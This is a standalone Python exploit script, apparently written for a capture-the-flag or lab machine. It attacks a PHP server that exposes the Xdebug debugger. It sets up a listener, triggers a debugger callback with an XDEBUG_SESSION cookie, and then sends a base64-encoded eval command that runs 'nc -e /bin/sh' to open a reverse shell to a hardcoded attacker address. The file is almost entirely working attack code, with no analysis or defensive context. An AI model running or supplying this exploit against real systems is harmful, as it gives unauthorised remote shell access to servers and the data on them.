#!/usr/bin/python3

import socket, requests, sys
from base64 import b64encode

if len(sys.argv) != 6:
    print("\n[*] usage python3 <program_name>{} <ext_port>{}  <ext_host>{}  <local_port>{} <local host> {} <context> {}\n ".format(sys.argv[0],sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5]))
    sys.exit(1)

#start Listener 
ext_port =int(sys.argv[1])
ext_host =sys.argv[2]
local_host = sys.argv[4]
local_port= int(sys.argv[3])
context= sys.argv[5]
attack_host="10.10.14.46"
attack_port="5656"
print("\n[*] Starting listener on {}:{}".format(local_host,local_port))

sk= socket.socket()
sk.bind((local_host,local_port))
sk.listen(10)

print("\n[*] Listening....")
print("\n[*] Contnue process  ")
try:
    print("\n[*] Start socket with {}:{}".format(ext_host,ext_port))
    uri="http://"+ext_host+":"+sys.argv[1]+"/"+context
    print("\n[*] uri request : {}".format(uri))
    print("\n[*] send request ...... ")
    r = requests.get(uri, headers={"Cookie":"XDEBUG_SESSION=llllllllll"}, timeout=2)
    print("----------")

except:
    pass

#catch callback
conn, addr =sk.accept()
print("\n [*] accept connection ")
client_data = conn.recv(1024)
print("\n[*] connection received from {}:{} on port {}".format(addr[0],addr[1],sys.argv[3]))
print((conn))
print((client_data))

cmd = 'system("nc -e /bin/sh {} {}")'.format(attack_host,attack_port).encode('utf-8')
print("\n[*] send cmd command: {}".format(cmd))
conn.sendall(('eval -i 1 -- %s\x00' % b64encode(cmd).decode('utf-8')).encode('utf-8'))
print("\n[*] exec reverse-shell from {}:{} to {}:{}".format(attack_host,attack_port,ext_host,sys.argv[1]))
sk.close()
conn.close()
